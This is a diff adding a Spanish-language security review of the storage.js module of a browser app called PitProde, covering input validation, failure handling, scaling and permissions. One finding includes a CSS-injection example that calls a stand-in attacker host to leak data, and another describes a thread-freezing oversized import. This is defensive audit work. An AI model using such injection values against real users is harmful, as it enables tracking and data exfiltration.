@@ -1,0 +1,40 @@
+---
+
+**Revisión: `storage.js` — PitProde**
+
+---
+
+**1. ¿Qué datos entran desde afuera sin validarse?**
+
+- `importarDatos(texto)`: recibe texto JSON del usuario vía `<input type="file">`. Pasa por `validarDatos()` y `normalizarDatos()` antes de usarse.
+- `cargarDatos()`: lee `localStorage.getItem(CLAVE_STORAGE)`, que puede haber sido manipulado directamente desde la consola del browser. También pasa por `importarDatos()`.
+- Dentro de `normalizarDatos()`, los campos string se aceptan con `esTexto()` (no vacío y tipo string), pero sin validar *formato* ni *longitud*. El caso más relevante es `color`.
+
+**2. ¿Qué pasa si esto falla?**
+
+- Corrupción en localStorage: detectada, se hace respaldo en `CLAVE_RESPALDO` y se arranca de cero. Bien manejado.
+- Si ese respaldo falla (sin espacio): se silencia explícitamente, con comentario. Intencional y aceptable.
+- `guardarDatos` captura cualquier excepción de `localStorage.setItem` y devuelve `{ ok: false }`. La app avisa en pantalla.
+
+**3. ¿Qué se rompe cuando el volumen crezca?**
+
+- `validarDatos` y `normalizarDatos` iteran todos los arrays sin límite. Ningún corte por tamaño.
+- `recalcularPuntos` (llamado desde `normalizarDatos`) hace `.find()` sobre GPs por cada pronóstico: O(n×m). Para un prode real es trivial; con un JSON artificialmente grande, bloquea el hilo.
+
+**4. ¿Quién puede ejecutar esto y con qué permisos?**
+
+- Todo corre en el browser del usuario. No hay servidor ni autenticación. Cualquier JS en la página tiene acceso directo a `localStorage` y puede sobreescribir `pitprode.datos` sin pasar por las validaciones del módulo.
+
+---
+
+**Hallazgos**
+
+**Media — storage.js:171 — `normalizarDatos` acepta cualquier string como `color` sin validar formato CSS**
+Entrada: JSON importado con `"color": "red; background-image: url(https://attacker.example/x?leak=1)"`. El string no está vacío → pasa `esTexto()` sin más revisión.
+Consecuencia: ese string llega intacto al `style` del span en `app.js` (`background:${j.color}`), inyectando CSS arbitrario. En navegadores modernos `url()` en `background-image` dispara una petición HTTP: posible exfiltración de datos presentes en la URL o tracking. No ejecuta JS, pero es el único campo del módulo que se anuncia como normalizador y no normaliza.
+
+---
+
+**Baja — storage.js:128–152 — `validarDatos` no limita el tamaño de los arrays**
+Entrada: archivo JSON importado con `"pronosticos": [/* 100.000 elementos */]`. Pasa el chequeo de `Array.isArray` sin más.
+Consecuencia: `validarDatos` itera los 100.000 elementos y luego `normalizarDatos` los procesa todos (incluyendo el `recalcularPuntos` con `.find()` anidado). Bloquea el hilo principal; el tab se congela y el browser puede matar la pestaña. La app queda inutilizable hasta reiniciar.
